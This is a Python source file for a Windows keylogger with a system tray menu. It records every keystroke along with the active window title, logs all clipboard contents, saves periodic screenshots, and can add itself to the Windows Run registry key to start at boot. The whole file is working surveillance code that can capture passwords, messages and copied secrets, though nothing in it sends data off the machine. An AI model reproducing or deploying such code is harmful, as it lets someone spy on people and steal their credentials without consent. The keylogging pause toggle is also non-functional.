import os
import sys
import time
import winreg
import logging
import requests
import threading
import pyautogui
import pyperclip
import webbrowser
from io import BytesIO
import pygetwindow as gw
from pynput import keyboard
from datetime import datetime
from plyer import notification
from PIL import Image, ImageDraw
from pystray import Icon, Menu, MenuItem

# Global variables
is_running = True
listener_running = True
screenshot_interval = 60  # Default interval (seconds)
screenshot_folder = "screenshots"
keylog_file = "key_log.txt"
clipboard_log_file = "clipboard_log.txt"
lock = threading.Lock()
current_window = None  # Currently active window
current_keys = []  # Keys typed in the current window
last_clipboard_content = None  # To track clipboard changes
current_line = ""
first_entry = True
active_window = ""

# Initialize logging
LOG_FILE = "Keylogerror.log"
logging.basicConfig(
    filename=LOG_FILE, 
    level=logging.INFO, # Set to INFO to log both info and error messages
    # format="%(asctime)s - %(message)s",
    format="%(asctime)s - %(levelname)s - %(message)s"
)

# Image paths
ICON_PATH = "icon.ico"  # Ensure this is an ICO file
APP_NAME = "Key Logger"

# Global variable to track the "Run on Startup" state
is_startup_enabled = False

# Ensure the screenshots folder exists
os.makedirs(screenshot_folder, exist_ok=True)

# Notification function
def show_notification(title, message):
    """
    Show a system notification.
    """
    try:
        notification.notify(
            title=title,
            message=message,
            app_name=APP_NAME,
            # app_icon=ICON_PATH,
            app_icon=ICON_PATH if os.path.exists(ICON_PATH) else None,
            timeout=3
        )
    except Exception as e:
        logging.error(f"Notification Error: {e}")

# Get the active window's title
def get_active_window_title():
    try:
        window = gw.getActiveWindow()
        if window is not None:
            return window.title
        return "Unknown Application"
    except Exception as e:
        print(f"Error getting active window title: {e}")
        logging.error(f"Error getting active window title: {e}")
        return "Unknown Application"

# Write a log entry to the file
def write_log_entry(window, keys, include_window_info=False):
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(keylog_file, "a", encoding="utf-8") as log_file:
            if include_window_info:  # Log the window info only once per window change
                log_file.write(f"\n[{timestamp}] - Active Window: {window}\n")
                log_file.write("----------------\n")
            if keys:
                log_file.write(f"{timestamp}: {''.join(keys)}\n")
        # print(f"Logged: {''.join(keys)}")  # Optional for debugging
    except Exception as e:
        logging.error(f"Error write_log_entry: {e}")

# Handle key press events
def on_press(key):
    global current_window, current_keys

    # Get the active window title
    active_window = get_active_window_title()

    # Detect window change
    if current_window != active_window:
        if current_window:
            # Log the previous window's data
            write_log_entry(current_window, current_keys)
        # Reset for the new window
        current_window = active_window
        current_keys = []
        write_log_entry(current_window, [], include_window_info=True)  # Log the new window info
    # logging.info(f"current window: {current_window}")
    
    # Handle key input
    try:
        key_char = key.char  # For printable characters
    except AttributeError as e:
        key_char = f"[{key}]"  # For special keys (e.g., Enter, Backspace)
        logging.error(f"Error handling key input on_press: {e}")

    # Record the key
    # Define a mapping for special keys to normalize their representation
    special_keys = {
        "[Key.space]": " ",
        "[Key.enter]": "\n",
        "[Key.esc]": "[Esc]",
        "[Key.tab]": "[Tab]",
        "[Key.caps_lock]": "[Caps Lock]",
        "[Key.shift]": "[Shift]",
        "[Key.shift_r]": "[Shift]",
        "[Key.ctrl]": "[Ctrl]",
        "[Key.ctrl_l]": "[Ctrl]",
        "[Key.ctrl_r]": "[Ctrl]",
        "[Key.fn]": "[Fn]",
        "[Key.cmd]": "[Win]",
        "[Key.cmd_l]": "[Win]",
        "[Key.cmd_r]": "[Win]",
        "[Key.alt]": "[Alt]",
        "[Key.alt_l]": "[Alt]",
        "[Key.alt_r]": "[Alt]",
        "[Key.alt_gr]": "[Alt]",
        "[Key.insert]": "[Insert]",
        "[Key.print_screen]": "[PrtSc]",
        "[Key.delete]": "[Delete]",
        "[Key.backspace]": "[Backspace]",
        "[Key.up]": "[Up Arrow]",
        "[Key.down]": "[Down Arrow]",
        "[Key.left]": "[Left Arrow]",
        "[Key.right]": "[Right Arrow]",
        "[Key.home]": "[Home]",
        "[Key.end]": "[End]",
        "[Key.page_up]": "[Page Up]",
        "[Key.page_down]": "[Page Down]",
        # Function keys
        "[Key.f1]": "[F1]",
        "[Key.f2]": "[F2]",
        "[Key.f3]": "[F3]",
        "[Key.f4]": "[F4]",
        "[Key.f5]": "[F5]",
        "[Key.f6]": "[F6]",
        "[Key.f7]": "[F7]",
        "[Key.f8]": "[F8]",
        "[Key.f9]": "[F9]",
        "[Key.f10]": "[F10]",
        "[Key.f11]": "[F11]",
        "[Key.f12]": "[F12]",
        # Add any other special keys here as needed
    }

    try:
        # Process the key character
        if key_char in special_keys:
            current_keys.append(special_keys[key_char])
        elif key_char is not None:  # Ignore None values
            current_keys.append(key_char)
        # else:
        #     current_keys.append(key_char)
    except Exception as e:
        logging.error(f"Error processing key press: {e}")
        pass  

# Handle key release events
def on_release(key):
    try:
        if key == keyboard.Key.esc:
            # On Esc key, finalize logging and stop the listener
            write_log_entry(current_window, current_keys)
            print("Keylogger stopped.")
            logging.info(f"keylogger stopped")
            return False
    except Exception as e:
        logging.error(f"Error on_release: {e}")

# Start the keylogger
def start_keylogger():
    try:
        timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
        with open(keylog_file, "a", encoding="utf-8") as log_file:
            log_file.write(f"\n[{timestamp}]---keylogger started---\n")
        logging.info(f"[{timestamp}]---keylogger started---")
        # listener = keyboard.Listener(on_press=on_press, on_release=on_release)
        # listener.start()
        # listener.join()
    except Exception as e:
        logging.error(f"Error on start_keylogger: {e}")


# Monitor clipboard changes
def monitor_clipboard():
    global last_clipboard_content
    while True:
        try:
            current_clipboard_content = pyperclip.paste()
            if current_clipboard_content != last_clipboard_content:
                last_clipboard_content = current_clipboard_content
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                with open(clipboard_log_file, "a", encoding="utf-8") as log_file:
                    log_file.write(f"{timestamp}: Copied: {current_clipboard_content}\n\n")
                # print(f"Clipboard updated: {current_clipboard_content}")  # Optional for debugging
            # logging.info(f"monitor_clipboard")
        except Exception as e:
            print(f"Error monitoring clipboard: {e}")
            logging.error(f"Error monitoring clipboard: {e}")
            pass
        time.sleep(1)  # Polling interval


# Take a screenshot
def take_screenshot():
    global screenshot_interval
    while True:
        try:
            if is_running:
                timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
                filename = os.path.join(screenshot_folder, f"screenshot_{timestamp}.png")
                pyautogui.screenshot(filename)
                print(f"Screenshot saved: {filename}")
            time.sleep(screenshot_interval)
            # logging.info(f"take_screenshot")
        except Exception as e:
            logging.error(f"Error taking screenshot: {e}")
        
# def take_screenshot():
#     global screenshot_interval
#     while True:
#         if is_running:
#             timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
#             filename = os.path.join(screenshot_folder, f"screenshot_{timestamp}.png")
#             pyautogui.screenshot(filename)
#             print(f"Screenshot saved: {filename}")
#         with lock:
#             current_interval = screenshot_interval
#         time.sleep(current_interval)



# Toggle screenshot taking
def toggle_screenshots(icon, item):
    global is_running
    is_running = not is_running
    if (is_running == True):
        show_notification(APP_NAME, "Enabled taking Screenshot")
    else:
        show_notification(APP_NAME, "Disabled taking Screenshot")
    # logging.info(f"toggle_screenshot")
    

# Toggle keylogging
def toggle_keylogging(icon, item):
    global listener_running
    listener_running = not listener_running
    if(listener_running == True):
        show_notification(APP_NAME, "Enabled Keylogger")
    else:
        show_notification(APP_NAME, "Disabled Keylogger")
    # logging.info(f"toggle_keylogging")
        

# Update screenshot interval
def set_interval(icon, item):
    global screenshot_interval
    try:
        with lock:
            screenshot_interval = int(item.text.split()[0])
        update_checkmarks(icon)
        # icon.notify(f"Screenshot interval set to {screenshot_interval} seconds.")
        show_notification(APP_NAME, f"Screenshot interval set to {screenshot_interval} seconds.")
        logging.info(f"set_interval")
    except Exception as e:
        logging.error(f"Error in set_interval: {e}")

# Stop script
def stop_script(icon):
    try:
        # Log the previous window's data
        write_log_entry(current_window, current_keys)
        show_notification(APP_NAME, "Keylogger is terminated...")
        logging.info(f"Script terminated")
        print("Stopping script...")
        # icon.notify(f"Keylogger terminated")
        os._exit(0)
    except Exception as e:
        logging.error(f"Error in stop_script: {e}")

# function to open developer page in browser 
def on_open_developer(icon):
    try:
        url = "https://bibekchandsah.com.np/developer.html"
        webbrowser.open(url)
        show_notification(APP_NAME, "Opening Developer Page...")
        logging.info(f"open_developer")
    except Exception as e:
        logging.error(f"Error opening Developer: {e}")

# Restart script
def restart_script(icon, item):
    try:
        print("Restarting script...")
        logging.info(f"restart_script")
        # icon.notify(f"Restarting the Keylogger")
        show_notification(APP_NAME, "Restarting Keylogger...")
        # global listener
        # listener.stop()
        icon.stop()
        # os.execv(sys.executable, ['python'] + sys.argv)
        os.execl(sys.executable, sys.executable, *sys.argv)
    except Exception as e:
        logging.error(f"Error restarting script: {e}")

# Toggle startup option
def toggle_startup(enable):
    """
    Enable or disable running the application on startup.
    """
    global is_startup_enabled
    try:
        startup_key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        if enable:
            winreg.SetValueEx(startup_key, APP_NAME, 0, winreg.REG_SZ, sys.executable + " " + sys.argv[0])
            show_notification(APP_NAME, "Enabled startup at boot.")
        else:
            winreg.DeleteValue(startup_key, APP_NAME)
            show_notification(APP_NAME, "Disabled startup at boot.")
        is_startup_enabled = enable
        winreg.CloseKey(startup_key)
    except Exception as e:
        logging.error(f"Error toggling startup: {e}")
        show_notification(APP_NAME, f"Error: {e}")

def is_startup_checked(item):
    """
    Return whether the "Run on Startup" option is enabled.
    The `item` argument is required by pystray but not used here.
    """
    return is_startup_enabled

def on_toggle_startup(icon, item):
    """
    Toggle the startup status based on user selection.
    """
    toggle_startup(not is_startup_enabled)

# Open log file        
def on_open_log(icon, item):
    """
    Open the log file in the default text editor.
    """
    try:
        if os.path.exists(LOG_FILE):
            os.startfile(LOG_FILE)
        else:
            raise FileNotFoundError("Log file not found.")
    except Exception as e:
        logging.error(f"Error opening log file: {e}")
        # show_notification("Image Viewer", f"Error: {e}")
        show_notification(APP_NAME, "Failed to open the log file.")

# Update checkmarks dynamically
def update_checkmarks(icon):
    interval_menu = Menu(
        MenuItem("30 seconds", set_interval, checked=lambda item: screenshot_interval == 30),
        MenuItem("60 seconds", set_interval, checked=lambda item: screenshot_interval == 60),
        MenuItem("120 seconds", set_interval, checked=lambda item: screenshot_interval == 120),
        MenuItem("300 seconds", set_interval, checked=lambda item: screenshot_interval == 300),
    )

    menu = Menu(
        MenuItem("Pause/Resume Screenshots", toggle_screenshots, checked=lambda item: is_running),
        MenuItem("Pause/Resume Keylogging", toggle_keylogging, checked=lambda item: listener_running),
        MenuItem("Set Screenshot Interval", interval_menu),
        MenuItem("Run on Startup", on_toggle_startup, checked=is_startup_checked),
        MenuItem("View Log", on_open_log),
        MenuItem("Developer", on_open_developer),
        MenuItem("Restart", restart_script),
        MenuItem("Exit", stop_script),
    )

    icon.menu = menu

# create icon for system tray
def create_icon():
    icon_image = Image.new("RGB", (64, 64), color=(255, 255, 255))
    draw = ImageDraw.Draw(icon_image)
    draw.ellipse((16, 16, 48, 48), fill=(0, 0, 255))


# Create tray icon
def create_tray_icon():
    """
    Create the system tray icon and menu.
    """
    def get_icon():
        """Retrieve the icon image."""
        try:
            # Check if the local icon file exists
            if os.path.exists(ICON_PATH):
                return Image.open(ICON_PATH)

            # If local file doesn't exist, try fetching from URL
            url = "https://cdn-icons-png.flaticon.com/512/4616/4616208.png"  # Replace with your image URL
            response = requests.get(url, timeout=5)
            response.raise_for_status()  # Raise an exception for HTTP errors
            return Image.open(BytesIO(response.content))

        except (FileNotFoundError, requests.exceptions.RequestException) as e:
            logging.error(f"Icon Load Error: {e}")
            return create_icon()  # Return a blue image as a fallback
    
    try:
        icon = Icon(
            APP_NAME, 
            get_icon(), 
            APP_NAME
        )
        update_checkmarks(icon)
        icon.run()
    except Exception as e:
        logging.error(f"Tray Icon Error: {e}")
        show_notification("Error", "Failed to load tray icon.")
        sys.exit(1)

def main():
    try:
        if not os.path.exists(ICON_PATH):
            logging.error("Icon file not found. Notifications will not include an icon.")
        show_notification(f"{APP_NAME} Started", "The application has started successfully.")
        
        # Start keylogger
        # listener = keyboard.Listener(on_press=on_press, on_release=on_release)
        start_keylogger()
        listener = keyboard.Listener(on_press=on_press)
        listener.start()

        # Start Keylogger in Thread
        # keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
        # keylogger_thread.start()

        # Start clipboard monitoring thread
        clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
        clipboard_thread.start()

        # Start screenshot thread
        screenshot_thread = threading.Thread(target=take_screenshot, daemon=True)
        screenshot_thread.start()

        # Start tray icon
        create_tray_icon()
        
    except KeyboardInterrupt:
        logging.info("Application interrupted by user.")
        show_notification(APP_NAME, "Keylogger is closing...")
        sys.exit(0)
    except Exception as e:
        logging.error(f"Main Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
